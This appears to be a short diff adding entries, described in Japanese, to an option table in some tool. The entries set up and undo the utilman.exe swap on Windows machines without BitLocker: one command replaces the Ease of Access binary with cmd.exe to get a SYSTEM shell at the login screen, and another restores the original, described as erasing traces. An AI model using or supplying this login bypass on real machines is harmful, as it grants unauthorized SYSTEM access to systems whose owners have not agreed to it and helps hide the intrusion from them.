@@ -1,0 +1,3 @@
+# utilman を どうするか（値・表示名・説明。BitLocker 無しのみ）
+sudo cp utilman.exe utilman.exe.bak && sudo cp cmd.exe utilman.exe	仕掛ける	原本を .bak に退避 → cmd.exe で上書き（「簡単操作」で SYSTEM の cmd）
+sudo cp utilman.exe.bak utilman.exe	戻す	退避した原本に戻す（痕跡を消す）
